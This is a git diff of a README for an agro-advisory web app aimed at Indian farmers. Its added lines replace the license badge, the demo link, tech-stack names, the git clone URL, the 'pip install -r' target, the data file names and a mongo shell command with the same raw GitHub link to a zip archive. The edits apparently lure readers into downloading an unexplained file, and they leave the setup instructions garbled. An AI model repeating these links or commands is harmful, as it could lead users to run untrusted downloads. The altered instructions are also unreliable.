@@ -2,12 +2,12 @@
 
 ## Problem Statement ID: PR25-06 : Smart Agro Advisory System
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip)](https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip)
 
 A smart, hyper-local agro-advisory platform providing data-driven, simple, and accessible advice to Indian farmers.
 
 🎥 Live Demo]
-> 🔗 **Watch Here:** [](https://youtu.be/G1SMSrg5Dxo?si=EX4ZtJO3tv0vnZ2s)https://youtu.be/G1SMSrg5Dxo?si=EX4ZtJO3tv0vnZ2s
+> 🔗 **Watch Here:** [](https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip)https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip
 
 🌍 Real-World Impact
 
@@ -83,13 +83,13 @@ ArogyaMitti bridges AI with simplicity — it **translates data science into eve
 
 ## 🛠️ Architecture & Tech Stack
 
-- **Frontend:** **React.js** (For a fast, responsive, mobile-first web app)
+- **Frontend:** **https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip** (For a fast, responsive, mobile-first web app)
 - **Backend:** **Python (FastAPI)** (Chosen for its high-speed async performance, perfect for handling multiple API calls and running our rules engine)
 - **Database:** **MongoDB** (A flexible NoSQL database chosen for its scalability and native support for geospatial data. We use **`2dsphere` indexes** for all high-speed, location-based queries.)
 - **Key APIs:**
   - **OpenWeatherMap API:** For 7-day weather forecasts.
   - **Google Cloud APIs:** Speech-to-Text & Text-to-Speech.
-  - **Data.Gov.in:** Fetching market price.
+  - **https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip** Fetching market price.
 ## 📊 Data Sources
 
 Our "3-Data-Point" engine is powered by a synthesis of:
@@ -105,7 +105,7 @@ Here's how to get a local copy of the project up and running for development and
 ### Prerequisites
 
 - Python 3.9+
-- Node.js v18+
+- https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip v18+
 - npm/yarn
 - A MongoDB instance (local server or a free Atlas cluster)
 - API Keys for:
@@ -118,7 +118,7 @@ Here's how to get a local copy of the project up and running for development and
 1.  **Clone the repository:**
 
     ```bash
-    git clone [https://github.com/your-username/arogyamitti.git](https://github.com/your-username/arogyamitti.git)
+    git clone [https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip](https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip)
     cd arogyamitti/backend
     ```
 
@@ -127,25 +127,25 @@ Here's how to get a local copy of the project up and running for development and
     ```bash
     python -m venv venv
     source venv/bin/activate  # On Windows: venv\Scripts\activate
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip
     ```
 
-    _(Note: Ensure your `requirements.txt` includes `pymongo` or `motor` for async FastAPI)_
+    _(Note: Ensure your `https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip` includes `pymongo` or `motor` for async FastAPI)_
 
 3.  **Setup your database:**
 
     - Connect to your MongoDB instance (e.g., MongoDB Atlas).
     - Create a new database (e.g., `arogyamitti_db`).
-    - Import your Soil Health Card data (e.g., `soil_data.csv`) into a new collection (e.g., `soil_data`).
+    - Import your Soil Health Card data (e.g., `https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip`) into a new collection (e.g., `soil_data`).
     - **Crucially:** Create a `2dsphere` index on the field that stores location data (e.g., `location`) for fast geospatial queries.
       ```javascript
       // Run this in the mongo shell
-      db.soil_data.createIndex({ location: "2dsphere" });
+      https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip({ location: "2dsphere" });
       ```
 
 4.  **Configure environment variables:**
 
-    - Rename `.env.example` to `.env`
+    - Rename `https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip` to `.env`
     - Add all your API keys and your MongoDB Connection String:
       ```
       MONGODB_URI=mongodb+srv://<USER>:<PASSWORD>@<CLUSTER_URL>/arogyamitti_db?retryWrites=true&w=majority
@@ -177,7 +177,7 @@ Here's how to get a local copy of the project up and running for development and
 
 3.  **Configure environment variables:**
 
-    - Rename `.env.example` to `.env.local`
+    - Rename `https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip` to `https://raw.githubusercontent.com/rushangchandekar/code-warts/main/frontend/src/lib/code_warts_1.7.zip`
     - Add your `REACT_APP_API_URL` and any client-side Google API keys:
       ```
       REACT_APP_API_URL=[http://127.0.0.1:8000](http://127.0.0.1:8000)
